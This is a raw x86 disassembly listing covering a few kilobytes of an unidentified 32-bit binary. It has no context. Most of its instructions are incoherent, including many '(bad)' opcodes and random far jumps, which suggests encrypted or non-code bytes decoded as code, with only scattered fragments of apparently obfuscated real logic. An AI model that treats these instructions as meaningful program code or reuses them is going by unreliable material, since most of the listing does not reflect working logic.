  40bef6:	or     bl,BYTE PTR [ebx-0x28]
  40bef9:	(bad)  
  40befa:	mov    ?,WORD PTR [ebx-0x4]
  40befd:	jo     0x40bf6f
  40beff:	jb     0x40bf80
  40bf01:	jo     0x40bf73
  40bf03:	push   ss
  40bf04:	xlat   BYTE PTR ds:[ebx]
  40bf05:	ror    DWORD PTR ds:[edi+0x711d7b63],0xd5
  40bf0d:	mov    esi,0x339ffea7
  40bf12:	sbb    esp,DWORD PTR [edi+0x23]
  40bf15:	js     0x40be9d
  40bf17:	xor    eax,0xc4f3da0b
  40bf1c:	and    DWORD PTR [si-0x35e7],eax
  40bf21:	push   0x95212261
  40bf26:	sub    eax,0x9749c206
  40bf2b:	gs inc edx
  40bf2d:	sub    ebx,DWORD PTR [esi-0x38a00f77]
  40bf33:	xchg   ecx,eax
  40bf34:	retf   0x832b
  40bf37:	jmp    0x40bec7
  40bf39:	inc    esp
  40bf3a:	jo     0x40bf07
  40bf3c:	ins    DWORD PTR es:[edi],dx
  40bf3d:	pop    ebp
  40bf3e:	sub    BYTE PTR [esi+0x1d],bl
  40bf41:	bound  esp,QWORD PTR [esi+ebp*4]
  40bf44:	push   ebx
  40bf45:	or     eax,DWORD PTR [edi+esi*8-0x31ab5fef]
  40bf4c:	dec    ebp
  40bf4d:	sbb    esp,DWORD PTR [ebp-0x419fbab0]
  40bf53:	enter  0xf025,0xfc
  40bf57:	jo     0x40bfce
  40bf59:	push   esi
  40bf5a:	mov    bh,0xf0
  40bf5c:	scas   al,BYTE PTR es:[edi]
  40bf5d:	and    eax,0xe667d419
  40bf62:	mov    ds:0xd851a99b,eax
  40bf67:	sub    al,0x12
  40bf69:	pop    esi
  40bf6a:	pop    esp
  40bf6b:	ficomp DWORD PTR [edi-0x7b93e854]
  40bf71:	not    ecx
  40bf73:	in     eax,dx
  40bf74:	dec    ebp
  40bf75:	dec    edi
  40bf76:	popa   
  40bf77:	dec    ebx
  40bf78:	cmp    edx,DWORD PTR ds:0xf71e80b4
  40bf7e:	xchg   ecx,eax
  40bf7f:	jecxz  0x40bf9c
  40bf81:	loope  0x40bf08
  40bf83:	nop
  40bf84:	retf   
  40bf85:	popa   
  40bf86:	es repz mov ch,0xad
  40bf8a:	cmp    BYTE PTR cs:[ebp-0x3],0x11
  40bf8f:	adc    dl,BYTE PTR [eax]
  40bf91:	push   ebp
  40bf92:	inc    esi
  40bf93:	loopne 0x40bf92
  40bf95:	hlt    
  40bf96:	mov    ebp,0xedebcc3d
  40bf9b:	hlt    
  40bf9c:	ja     0x40bff4
  40bf9e:	mov    edi,0xbf73cc0c
  40bfa3:	lock inc edi
  40bfa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfa6:	dec    esp
  40bfa7:	aas    
  40bfa8:	jnp    0x40bf7c
  40bfaa:	or     al,0x10
  40bfac:	ja     0x40bfbf
  40bfae:	dec    ebp
  40bfaf:	mov    bh,0x14
  40bfb1:	mul    DWORD PTR [ebp-0x7c72b2f8]
  40bfb7:	in     al,dx
  40bfb8:	adc    eax,0x6985f69b
  40bfbd:	dec    eax
  40bfbe:	dec    esp
  40bfbf:	adc    al,0x24
  40bfc1:	mov    dl,0x95
  40bfc3:	fcomp  st(3)
  40bfc5:	and    eax,0x8d137118
  40bfca:	jg     0x40bffe
  40bfcc:	adc    ebx,edx
  40bfce:	or     esp,DWORD PTR [eax]
  40bfd0:	loopne 0x40c03b
  40bfd2:	mov    edi,0xa6c7651f
  40bfd7:	xor    DWORD PTR [eax+0x75372d14],edx
  40bfdd:	fcom   DWORD PTR [edx-0x1a3323b7]
  40bfe3:	adc    al,0xb
  40bfe5:	cdq    
  40bfe6:	mov    edx,DWORD PTR [bx+0x1a3]
  40bfeb:	cld    
  40bfec:	inc    esi
  40bfed:	inc    esi
  40bfee:	and    BYTE PTR [ebp-0x69],dh
  40bff1:	adc    al,0x5a
  40bff3:	jecxz  0x40c039
  40bff5:	mov    ebp,0x35f1846f
  40bffa:	jmp    0xb588:0xe45c8a8a
  40c001:	cmp    al,0xc6
  40c003:	bound  ebx,QWORD PTR [ecx-0x5bd9a66d]
  40c009:	popa   
  40c00a:	das    
  40c00b:	cmc    
  40c00c:	push   cs
  40c00d:	addr16 call 0x28f70095
  40c013:	ins    DWORD PTR es:[edi],dx
  40c014:	xor    DWORD PTR [esi],ebx
  40c016:	xchg   ebx,eax
  40c017:	jns    0x40c070
  40c019:	mov    edi,0xcd54aa62
  40c01e:	and    eax,DWORD PTR [ecx]
  40c020:	dec    ebx
  40c021:	jp     0x40bfd6
  40c023:	std    
  40c024:	sub    eax,0xfca69a4a
  40c029:	popa   
  40c02a:	xor    al,0x2a
  40c02c:	int    0x14
  40c02e:	ss dec ebp
  40c030:	repz sub ecx,DWORD PTR [ebx]
  40c033:	adc    al,0x74
  40c035:	imul   eax,DWORD PTR [edi],0x37
  40c038:	inc    esi
  40c039:	(bad)  
  40c03b:	add    al,0xc3
  40c03d:	add    ah,BYTE PTR [ebp-0x3e1718ff]
  40c043:	jmp    0x40c074
  40c045:	repnz in al,0xc7
  40c048:	jns    0x40bfcc
  40c04a:	test   al,0x44
  40c04d:	lods   al,BYTE PTR ds:[esi]
  40c04e:	std    
  40c04f:	pop    sp
  40c051:	rol    BYTE PTR [eax],1
  40c053:	hlt    
  40c054:	xlat   BYTE PTR ds:[ebx]
  40c055:	repz adc al,0xe7
  40c058:	test   BYTE PTR [ebx-0x6c2ebfaa],dh
  40c05e:	jmp    0x40c0d1
  40c060:	(bad)  
  40c061:	daa    
  40c062:	ror    DWORD PTR [ebx],cl
  40c064:	and    BYTE PTR [ecx+0x5a],ch
  40c067:	add    DWORD PTR [edi],esi
  40c069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c06a:	repz and al,0x48
  40c06d:	and    al,0x9c
  40c06f:	movntps XMMWORD PTR [esi-0x43ec06d7],xmm6
  40c076:	ins    DWORD PTR es:[edi],dx
  40c077:	adc    al,0x3e
  40c079:	or     eax,0x8b5181f3
  40c07e:	repz sbb DWORD PTR [edx],esi
  40c081:	ins    BYTE PTR es:[edi],dx
  40c082:	sub    eax,0x35b72680
  40c087:	shl    BYTE PTR [ecx-0x38],0x2f
  40c08b:	das    
  40c08c:	jbe    0x40c064
  40c08e:	jge    0x40c06f
  40c090:	pop    eax
  40c091:	sbb    ebp,esi
  40c093:	cmp    al,0x3c
  40c095:	outs   dx,DWORD PTR ds:[esi]
  40c096:	out    0x60,eax
  40c098:	call   0x798ff213
  40c09d:	xor    dh,ah
  40c09f:	dec    eax
  40c0a0:	or     eax,DWORD PTR [esi+0x34b641a4]
  40c0a6:	mov    esi,DWORD PTR [edi+0x9]
  40c0a9:	pop    esp
  40c0aa:	adc    DWORD PTR [edx+edx*8+0x448a5d61],ebx
  40c0b1:	pop    ds
  40c0b2:	pop    edi
  40c0b3:	mov    eax,0xdfbf2e25
  40c0b8:	xor    eax,0xd4d43dfe
  40c0bd:	or     al,0x63
  40c0bf:	arpl   WORD PTR ds:0x850108ea,di
  40c0c5:	sbb    dh,BYTE PTR es:[ebp+0x7f]
  40c0c9:	jl     0x40c0b2
  40c0cb:	adc    dl,bl
  40c0cd:	cmp    BYTE PTR [ebx-0x42],ah
  40c0d0:	into   
  40c0d1:	fcmove st,st(1)
  40c0d3:	mov    ah,0xc4
  40c0d5:	(bad)  
  40c0d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0d7:	fcmovne st,st(6)
  40c0d9:	xor    BYTE PTR [ebx-0x5350afb9],bl
  40c0df:	pop    es
  40c0e0:	lea    esi,[eax+ebx*1+0x6e]
  40c0e4:	pop    ebx
  40c0e5:	adc    edx,ebx
  40c0e7:	pop    ebx
  40c0e8:	out    dx,al
  40c0e9:	ja     0x40c0cf
  40c0eb:	imul   eax,DWORD PTR [edi+0x7832fc16],0x5ba9f52
  40c0f5:	adc    al,0xc8
  40c0f7:	sub    dl,BYTE PTR [esi]
  40c0f9:	dec    ebx
  40c0fa:	sbb    al,ch
  40c0fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0fd:	ins    DWORD PTR es:[edi],dx
  40c0fe:	mov    cl,0x76
  40c100:	xchg   edi,eax
  40c101:	mov    esi,DWORD PTR [ebp+0x8]
  40c104:	mov    ecx,0x32729c
  40c109:	add    eax,ecx
  40c10b:	jmp    0x40c326
  40c110:	cli    
  40c111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c112:	push   ds
  40c113:	in     eax,0x21
  40c115:	gs inc ecx
  40c117:	arpl   WORD PTR [ebp*1+0x751a53b5],si
  40c11e:	(bad)  
  40c11f:	(bad)  
  40c120:	jge    0x40c11c
  40c122:	jo     0x40c194
  40c124:	jb     0x40c1a5
  40c126:	jo     0x40c198
  40c128:	sbb    al,0x51
  40c12a:	stos   DWORD PTR es:[edi],eax
  40c12b:	aaa    
  40c12c:	aad    0x6a
  40c12e:	push   esi
  40c12f:	push   ss
  40c130:	in     eax,0x52
  40c132:	test   eax,0xf74107f9
  40c137:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c138:	mov    ds,WORD PTR [esp+ebx*4-0x3bc144c0]
  40c13f:	in     eax,dx
  40c140:	lds    ebx,FWORD PTR [ebx]
  40c142:	mov    bl,0x8f
  40c144:	cwde   
  40c145:	and    al,0x12
  40c147:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c148:	jno    0x40c1a8
  40c14a:	xchg   ebp,eax
  40c14b:	cld    
  40c14c:	sbb    BYTE PTR [ebx+eiz*2],bl
  40c14f:	and    DWORD PTR [ebx-0x37ffdcc],eax
  40c155:	jp     0x40c19d
  40c157:	fcmovnu st,st(4)
  40c159:	pop    ebx
  40c15a:	mov    bl,0xed
  40c15c:	or     edi,ebp
  40c15e:	sbb    eax,0x40847806
  40c163:	fidiv  WORD PTR [ebx]
  40c165:	fcmovbe st,st(6)
  40c167:	xchg   edi,eax
  40c168:	icebp  
  40c169:	lahf   
  40c16a:	mov    al,0x57
  40c16c:	mov    ss,WORD PTR [eax-0x4]
  40c16f:	pop    ebx
  40c170:	xor    al,0x7d
  40c172:	mov    bh,0x5a
  40c174:	jmp    0x779e239
  40c179:	mov    ebx,0xfcf30556
  40c17e:	cmp    bl,dl
  40c180:	push   0x5be69602
  40c185:	add    DWORD PTR [edi+0x63142f26],esi
  40c18b:	and    esp,DWORD PTR [edi+0x1867befc]
  40c191:	mov    dl,0xaa
  40c193:	and    BYTE PTR [edx+0x4b38fec4],cl
  40c199:	in     eax,dx
  40c19a:	ret    
  40c19b:	fisttp WORD PTR [ebp-0x59]
  40c19e:	mov    ecx,0xf82f1751
  40c1a3:	lods   al,BYTE PTR ds:[esi]
  40c1a4:	das    
  40c1a5:	jae    0x40c12c
  40c1a7:	nop
  40c1a8:	mov    BYTE PTR [ebx-0x70bd9342],bl
  40c1ae:	xlat   BYTE PTR ds:[ebx]
  40c1af:	in     al,0xa9
  40c1b1:	pop    ds
  40c1b2:	(bad)  
  40c1b3:	(bad)  
  40c1b5:	popa   
  40c1b6:	out    0x20,al
  40c1b8:	dec    eax
  40c1b9:	mov    BYTE PTR [edi],al
  40c1bb:	or     eax,0x202f3a28
  40c1c0:	in     eax,dx
  40c1c1:	mov    eax,0x21824408
  40c1c6:	sahf   
  40c1c7:	aas    
  40c1c8:	and    al,0xfa
  40c1ca:	mov    ch,0xb8
  40c1cc:	cld    
  40c1cd:	int3   
  40c1ce:	push   esp
  40c1cf:	lea    esp,[eax+0x3cdeffff]
  40c1d5:	outs   dx,DWORD PTR ds:[esi]
  40c1d6:	call   0x4872:0xd6975fac
  40c1dd:	rcl    BYTE PTR [eax-0x2f],cl
  40c1e0:	loopne 0x40c1aa
  40c1e2:	fnstsw WORD PTR [eax+0x473368eb]
  40c1e8:	adc    al,BYTE PTR ds:0x11afd16d
  40c1ee:	aas    
  40c1ef:	push   edi
  40c1f0:	enter  0x6c84,0x70
  40c1f4:	push   cs
  40c1f5:	push   ss
  40c1f6:	sar    DWORD PTR [ebp-0x6c],0x1e
  40c1fa:	push   es
  40c1fb:	fnstcw WORD PTR [edx]
  40c1fd:	arpl   WORD PTR [ebx],sp
  40c1ff:	jp     0x40c182
  40c201:	push   0xde83359c
  40c206:	lods   eax,DWORD PTR ds:[esi]
  40c207:	mov    ebx,0x91cbce54
  40c20c:	cmp    al,BYTE PTR [eax]
  40c20e:	cdq    
  40c20f:	sti    
  40c210:	cld    
  40c211:	ficom  WORD PTR [edx]
  40c213:	mov    ebx,0x9e42bfa7
  40c218:	or     eax,edx
  40c21a:	test   ax,0x950a
  40c21e:	lea    ebx,[esi+0x1e951a27]
  40c224:	mov    dl,0x3e
  40c226:	in     eax,0x3c
  40c228:	xchg   esp,eax
  40c229:	ret    
  40c22a:	or     BYTE PTR [ebx+edx*1+0x5f],ch
  40c22e:	les    edi,FWORD PTR ds:0x7d8fb826
  40c234:	mov    edi,0x3f622785
  40c239:	cmp    DWORD PTR [esi+0x29],edi
  40c23c:	frstor [ecx-0x3c]
  40c23f:	(bad)
  40c242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c243:	inc    esp
  40c244:	jl     0x40c23a
  40c246:	adc    ebp,DWORD PTR [edx-0x8485dd8]
  40c24c:	or     eax,DWORD PTR [ebx]
  40c24e:	push   ebp
  40c24f:	popf   
  40c250:	dec    esi
  40c251:	pusha  
  40c252:	mov    ah,0xf3
  40c254:	repz out dx,al
  40c256:	xchg   ecx,ebx
  40c258:	jb     0x40c224
  40c25a:	jle    0x40c24a
  40c25c:	xor    ah,BYTE PTR [ebp+ebx*8+0x7285006f]
  40c263:	shl    BYTE PTR [edi-0x8a3e1a4],1
  40c269:	call   DWORD PTR [ebp-0x35]
  40c26c:	into   
  40c26d:	adc    esi,edi
  40c26f:	in     eax,dx
  40c270:	ror    eax,cl
  40c272:	push   ecx
  40c273:	inc    edi
  40c274:	mov    ecx,0xd84e17c0
  40c279:	jg     0x40c252
  40c27b:	xchg   BYTE PTR [ebx],al
  40c27d:	cmp    dh,BYTE PTR [ebp+0x4f22ec76]
  40c283:	shl    al,1
  40c285:	sahf   
  40c286:	adc    DWORD PTR [edi+0x6a38f472],ebp
  40c28c:	push   ss
  40c28d:	rcl    DWORD PTR [edi],cl
  40c28f:	jmp    0xf633:0x9be386c2
  40c296:	in     eax,0xed
  40c298:	test   DWORD PTR [ebp-0x17],ecx
  40c29b:	outs   dx,DWORD PTR ds:[esi]
  40c29c:	(bad)  
  40c29d:	popf   
  40c29e:	repz mov ebp,0x8a5d19b1
  40c2a4:	call   0x438c:0x98bfe0c
  40c2ab:	repnz in eax,0x3a
  40c2ae:	jae    0x40c2ec
  40c2b0:	bswap  eax
  40c2b2:	stos   BYTE PTR es:[edi],al
  40c2b3:	pop    es
  40c2b4:	shr    DWORD PTR [eax],0xd9
  40c2b7:	pop    esi
  40c2b8:	mov    esp,0x841e15ef
  40c2bd:	out    0xea,eax
  40c2bf:	fld    QWORD PTR [ebp-0x33]
  40c2c2:	cwde   
  40c2c3:	daa    
  40c2c4:	mov    ah,0x1c
  40c2c6:	jnp    0x40c25f
  40c2c8:	and    eax,0x1fea9318
  40c2cd:	xchg   DWORD PTR [edi-0x24],eax
  40c2d0:	out    dx,al
  40c2d1:	inc    esi
  40c2d2:	mov    edi,0x37323615
  40c2d7:	jle    0x40c323
  40c2d9:	jnp    0x40c28d
  40c2db:	cwde   
  40c2dc:	test   al,0xfd
  40c2de:	add    BYTE PTR [ebp+ebx*8+0x1a],dh
  40c2e2:	dec    ebp
  40c2e3:	or     DWORD PTR [ebx+0x3464c5b1],0xe6b0e169
  40c2ed:	cmp    eax,0x1ff8a6db
  40c2f2:	gs mov edx,0x5f1f4351
  40c2f8:	push   ds
  40c2f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2fa:	or     al,dh
  40c2fc:	mov    ebp,0xe3433e65
  40c301:	push   esi
  40c302:	dec    ebp
  40c303:	and    ebp,esp
  40c305:	xchg   ecx,eax
  40c306:	les    ebx,FWORD PTR [edx-0x17]
  40c309:	aas    
  40c30a:	adc    eax,0xd42eae1e
  40c30f:	enter  0xe514,0xcf
  40c313:	ds ja  0x40c321
  40c316:	repnz mov bh,0x55
  40c319:	test   BYTE PTR [esi],al
  40c31b:	jae    0x40c331
  40c31d:	fidiv  WORD PTR [ecx-0x458ac8b8]
  40c323:	nop
  40c324:	add    BYTE PTR [ebx],ch
  40c326:	cmp    DWORD PTR [esi+0x54],eax
  40c329:	pop    esi
  40c32a:	je     0x40c338
  40c330:	mov    eax,DWORD PTR [ebp+0x8]
  40c333:	jmp    0x40c787
  40c338:	mov    eax,DWORD PTR [ebp-0x4]
  40c33b:	xor    eax,edx
  40c33d:	add    eax,ecx
  40c33f:	jmp    0x40c787
  40c344:	mov    eax,DWORD PTR [ebp-0x4]
  40c347:	jmp    0x40c562
  40c34c:	or     eax,0x739e7462
  40c351:	scas   al,BYTE PTR es:[edi]
  40c352:	shl    DWORD PTR [ecx-0x41],1
  40c355:	jb     0x40c38a
  40c357:	loop   0x40c3d1
  40c359:	retf   
  40c35a:	xchg   edx,eax
  40c35b:	mov    bh,BYTE PTR [edi-0x8]
  40c35e:	jo     0x40c3d0
  40c360:	jb     0x40c3e1
  40c362:	jo     0x40c3d4
  40c364:	jnp    0x40c32e
  40c366:	xchg   ebx,eax
  40c367:	bswap  edx
  40c369:	cld    
  40c36a:	hlt    
  40c36b:	inc    ebp
  40c36c:	mov    esi,0xf3bce66b
  40c371:	adc    dh,cl
  40c373:	xchg   edx,eax
  40c374:	mov    bh,0x48
  40c376:	(bad)  
  40c377:	lea    ebp,[ebx]
  40c379:	call   0xd4472364
  40c37e:	dec    edx
  40c37f:	mov    edi,0x8d1897f2
  40c384:	xor    DWORD PTR [eax],0xffdce0c4
  40c38a:	xor    ah,BYTE PTR [edx]
  40c38c:	mov    DWORD PTR [edi-0x3f],esp
  40c38f:	inc    edi
  40c390:	push   ss
  40c391:	ja     0x40c3e6
  40c393:	or     DWORD PTR [ebp+0x1faf92cd],0x69f175d8
  40c39d:	cli    
  40c39e:	cdq    
  40c39f:	inc    edx
  40c3a0:	mov    esp,0x1fa380f5
  40c3a5:	test   eax,0x610c2078
  40c3aa:	sub    ecx,DWORD PTR [ebx+0x7c]
  40c3ad:	in     eax,dx
  40c3ae:	popa   
  40c3af:	sub    BYTE PTR [edx+esi*8-0x68620c5],bl
  40c3b6:	xlat   BYTE PTR ds:[ebx]
  40c3b7:	imul   esi,DWORD PTR [edx+0x1a],0xffffffab
  40c3bb:	cmp    ch,dh
  40c3bd:	repnz sub BYTE PTR [esi+0x7d7ffe24],ch
  40c3c4:	stos   DWORD PTR es:[edi],eax
  40c3c5:	xchg   DWORD PTR [ecx],ebp
  40c3c7:	dec    ebp
  40c3c8:	mov    al,0x5e
  40c3ca:	scas   al,BYTE PTR es:[edi]
  40c3cb:	out    0x5,eax
  40c3cd:	jl     0x40c3ba
  40c3cf:	fs lahf 
  40c3d1:	push   0xc728309b
  40c3d6:	xor    al,0xbb
  40c3d8:	enter  0x4036,0x56
  40c3dc:	mov    al,ds:0x9cb0e120
  40c3e1:	hlt    
  40c3e2:	pop    ecx
  40c3e3:	lahf   
  40c3e4:	ins    BYTE PTR es:[edi],dx
  40c3e5:	out    0x38,eax
  40c3e7:	jnp    0x40c42c
  40c3e9:	xor    al,bh
  40c3eb:	pop    esi
  40c3ec:	rol    edx,1
  40c3ee:	int3   
  40c3ef:	mov    ds:0xeba578ce,eax
  40c3f4:	add    DWORD PTR [ebx],0xffffffa5
  40c3f7:	jae    0x40c3a0
  40c3f9:	fs dec esp
  40c3fb:	dec    esi
  40c3fc:	(bad)  
  40c3fd:	ret    0xb0af
  40c400:	(bad)
  40c403:	sti    
  40c404:	sbb    eax,0x43789086
  40c409:	pop    es
  40c40a:	ins    BYTE PTR es:[edi],dx
  40c40b:	mov    edi,0xd0953926
  40c410:	mov    ds:0x317d5042,eax
  40c415:	inc    esi
  40c416:	loope  0x40c47e
  40c418:	in     eax,0xdf
  40c41a:	push   ebx
  40c41b:	or     eax,0x5e0b2f05
  40c420:	mov    edi,0x66de0289
  40c425:	in     al,dx
  40c426:	pop    edx
  40c427:	cli    
  40c428:	inc    ebp
  40c429:	aaa    
  40c42a:	or     ah,bh
  40c42c:	push   cs
  40c42d:	fucomp st(6)
  40c42f:	mov    edx,0xe1ad0f64
  40c434:	ins    BYTE PTR es:[edi],dx
  40c435:	and    DWORD PTR [ecx+0x41],edx
  40c438:	cmp    eax,0x7f86473d
  40c43d:	mov    esi,0x261786b2
  40c442:	push   ebx
  40c443:	mov    cs,WORD PTR [ebx+eiz*2+0x4af1a9c5]
  40c44a:	jo     0x40c4c0
  40c44c:	les    ebp,FWORD PTR [esi-0x38d32527]
  40c452:	pop    ebx
  40c453:	cmp    eax,0xade01ec9
  40c458:	jnp    0x40c483
  40c45a:	sub    DWORD PTR [esi+0x2f],ecx
  40c45d:	leave  
  40c45e:	hlt    
  40c45f:	cmp    esp,DWORD PTR [ebp-0x2a1c9a21]
  40c465:	adc    BYTE PTR [ebp+0x1b],ch
  40c468:	fwait
  40c469:	aas    
  40c46a:	pop    esp
  40c46b:	cmp    dh,cl
  40c46d:	pop    es
  40c46e:	push   edx
  40c46f:	cmp    DWORD PTR [ecx-0x45],eax
  40c472:	mov    ah,0xcb
  40c474:	dec    eax
  40c475:	sub    ah,BYTE PTR [ecx+0x5d36ed6a]
  40c47b:	add    DWORD PTR [esi-0x24],edx
  40c47e:	mov    eax,0xfae61d08
  40c483:	stos   DWORD PTR es:[edi],eax
  40c484:	(bad)  
  40c485:	xchg   edx,eax
  40c486:	sbb    DWORD PTR [edx],eax
  40c488:	fsub   st,st(7)
  40c48a:	stos   BYTE PTR es:[edi],al
  40c48b:	lods   al,BYTE PTR ds:[esi]
  40c48c:	dec    ebp
  40c48d:	imul   eax,DWORD PTR [ecx+ebx*1+0x49c112d3],0xa81687f2
  40c498:	fistp  WORD PTR [ebp-0x66579fae]
  40c49e:	aas    
  40c49f:	(bad)  
  40c4a0:	sbb    edx,edx
  40c4a2:	aad    0x57
  40c4a4:	div    ebp
  40c4a6:	bound  ebx,QWORD PTR [esi+0x523c0e6c]
  40c4ac:	cli    
  40c4ad:	ret    0x6b29
  40c4b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4b1:	sub    eax,DWORD PTR [ecx-0x78]
  40c4b4:	mov    eax,DWORD PTR [ecx+eax*4]
  40c4b7:	inc    ebp
  40c4b8:	push   ss
  40c4b9:	cmp    BYTE PTR [ebx-0x2e],cl
  40c4bc:	xchg   edi,ebx
  40c4be:	inc    ecx
  40c4bf:	mov    edi,0x24725c0
  40c4c4:	(bad)  
  40c4c5:	xlat   BYTE PTR ds:[ebx]
  40c4c6:	fimul  WORD PTR [esi+ecx*1+0x4695212b]
  40c4cd:	sbb    ch,dh
  40c4cf:	pop    esi
  40c4d0:	mov    ds:0x151af18a,eax
  40c4d5:	shl    esi,1
  40c4d7:	test   BYTE PTR [ebx],al
  40c4d9:	mov    BYTE PTR [ecx+0x29],bl
  40c4dc:	cs xchg edi,eax
  40c4de:	pop    ecx
  40c4df:	add    DWORD PTR [ebx],esp
  40c4e1:	pop    es
  40c4e2:	retf   
  40c4e3:	adc    BYTE PTR [edx+eiz*8-0x38],cl
  40c4e7:	mov    ch,0x58
  40c4e9:	outs   dx,BYTE PTR ds:[esi]
  40c4ea:	sti    
  40c4eb:	mov    esi,0x1815eaf2
  40c4f0:	clc    
  40c4f1:	iret   
  40c4f2:	xor    dl,BYTE PTR [edi+0x329a4044]
  40c4f8:	pop    ebx
  40c4f9:	mov    ecx,0x834a21d8
  40c4fe:	bound  edx,QWORD PTR [ecx-0x64]
  40c501:	retf   
  40c502:	xchg   ebx,eax
  40c503:	mov    esp,0xcd5d6261
  40c508:	in     al,0x56
  40c50a:	js     0x40c51d
  40c50c:	and    DWORD PTR [ebp+0x58],edx
  40c50f:	fcmovnu st,st(0)
  40c511:	addr16 cmp edi,ecx
  40c514:	test   ebp,edx
  40c516:	jg     0x40c572
  40c518:	mov    edx,0xeea4d44a
  40c51d:	aaa    
  40c51e:	jl     0x40c52e
  40c520:	mov    bl,0x71
  40c522:	jno    0x40c4a6
  40c524:	jl     0x40c546
  40c526:	fsubrp st(5),st
  40c528:	lahf   
  40c529:	scas   eax,DWORD PTR es:[edi]
  40c52a:	xchg   esp,eax
  40c52b:	je     0x40c4ee
  40c52d:	cmp    eax,0xd84abb65
  40c532:	mov    dl,0xf5
  40c534:	xor    al,dl
  40c536:	fnsave [esi+0x25fd7202]
  40c53c:	mov    ds:0xad0821c9,eax
  40c541:	in     eax,0xe1
  40c543:	mov    dh,0xcc
  40c545:	in     al,0x99
  40c547:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c548:	inc    edi
  40c549:	push   ss
  40c54a:	xor    edi,DWORD PTR [esi]
  40c54c:	scas   al,BYTE PTR es:[edi]
  40c54d:	mov    ah,0x6c
  40c54f:	in     eax,dx
  40c550:	mov    dl,0x4f
  40c552:	xchg   ebp,eax
  40c553:	cmp    DWORD PTR [ebp-0x6f],eax
  40c556:	jg     0x40c5a5
  40c558:	mov    cl,0xc7
  40c55a:	inc    eax
  40c55b:	pop    eax
  40c55c:	inc    ecx
  40c55d:	int3   
  40c55e:	lods   eax,DWORD PTR ds:[esi]
  40c55f:	pop    ebx
  40c560:	sbb    bh,BYTE PTR [ebp+0x35]
  40c563:	push   ebp
  40c564:	or     BYTE PTR [ecx+0x7],dl
  40c567:	jmp    0x40c782
  40c56c:	jnp    0x40c5eb
  40c56e:	xchg   edi,eax
  40c56f:	les    edx,FWORD PTR [ecx+0x72c54b52]
  40c575:	sub    esi,DWORD PTR [eax-0xf]
  40c578:	icebp  
  40c579:	push   es
  40c57a:	mov    ecx,0x708771ed
  40c57f:	jo     0x40c5f3
  40c581:	jg     0x40c5f3
  40c583:	jo     0x40c566
  40c585:	ror    DWORD PTR [eiz*1+0x408a522c],cl
  40c58c:	inc    esp
  40c58d:	test   BYTE PTR [ebp+ecx*1+0x2c],dh
  40c591:	or     eax,0x3eb5f89b
  40c596:	dec    edi
  40c597:	test   eax,0xa0da283b
  40c59c:	test   eax,0x7590b30c
  40c5a1:	mov    bh,0xca
  40c5a3:	sbb    DWORD PTR [edx],0xb5102db7
  40c5a9:	add    ecx,edx
  40c5ab:	inc    ebx
  40c5ac:	(bad)  
  40c5ad:	xlat   BYTE PTR ds:[ebx]
  40c5ae:	ins    DWORD PTR es:[edi],dx
  40c5af:	fild   WORD PTR [edi+0x19ed3e0c]
  40c5b5:	and    edi,DWORD PTR [ebp+0x54c33630]
  40c5bb:	fwait
  40c5bc:	and    al,0xd3
  40c5be:	and    al,0x88
  40c5c0:	push   ebp
  40c5c1:	dec    ebp
  40c5c2:	ss addr16 std 
  40c5c5:	retf   
  40c5c6:	xor    DWORD PTR [esi+0x71],ebp
  40c5c9:	adc    eax,0xd23152f9
  40c5ce:	mov    edx,0xdbca41d6
  40c5d3:	mov    cl,0xc0
  40c5d5:	cli    
  40c5d6:	push   ebp
  40c5d7:	cmc    
  40c5d8:	push   es
  40c5d9:	pop    esi
  40c5da:	mov    BYTE PTR [ecx+0x5e549a9a],dl
  40c5e0:	nop
  40c5e1:	mov    DWORD PTR [ebx-0x783ed388],ebp
  40c5e7:	inc    ebx
  40c5e8:	leave  
  40c5e9:	enter  0xe395,0x23
  40c5ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5ee:	cmc    
  40c5ef:	cmc    
  40c5f0:	sar    al,1
  40c5f2:	aam    0xef
  40c5f4:	push   ds
  40c5f5:	and    BYTE PTR [ebp+0x43],dh
  40c5f8:	ins    DWORD PTR es:[edi],dx
  40c5f9:	add    BYTE PTR [edi-0x4a],0xa6
  40c5fd:	div    DWORD PTR [esp+ebp*2+0xd]
  40c601:	xchg   BYTE PTR [ebx-0x11],ch
  40c604:	jnp    0x40c64f
  40c606:	mov    edx,0x4423862e
  40c60b:	test   DWORD PTR [esp+edx*4+0x557a69fb],ebp
  40c612:	in     eax,dx
  40c613:	xchg   ebx,eax
  40c614:	jp     0x40c5fb
  40c616:	mov    ss,WORD PTR [edi+0xc320223]
  40c61c:	retf   
  40c61d:	or     DWORD PTR [edi],0xfffffff6
  40c620:	or     al,0x1a
  40c622:	mov    dl,BYTE PTR [esi+eiz*8-0x72]
  40c626:	addr16 sub eax,0x337707b8
  40c62c:	iret   
  40c62d:	fidiv  DWORD PTR [ebx]
  40c62f:	xchg   ecx,eax
  40c630:	xchg   ebx,eax
  40c631:	jo     0x40c5b8
  40c633:	pop    es
  40c634:	data16 mov ah,0xe0
  40c637:	daa    
  40c638:	arpl   dx,bp
  40c63a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c63b:	and    bh,BYTE PTR [edi-0x62]
  40c63e:	xchg   esp,eax
  40c63f:	dec    eax
  40c640:	adc    bh,BYTE PTR [edi]
  40c642:	cmc    
  40c643:	sub    al,0xfa
  40c645:	mov    dl,0x11
  40c647:	pop    es
  40c648:	push   ebp
  40c649:	daa    
  40c64a:	sbb    dh,ch
  40c64c:	inc    ecx
  40c64d:	mov    ds:0xee1e4c99,al
  40c652:	push   edx
  40c653:	int    0x74
  40c655:	call   0xee40e789
  40c65a:	popf   
  40c65b:	ret    
  40c65c:	icebp  
  40c65d:	retf   0xb60d
  40c660:	shr    DWORD PTR [eax+eax*8],0x65
  40c664:	dec    esp
  40c665:	mov    al,0xc4
  40c667:	test   BYTE PTR [edx],0xe2
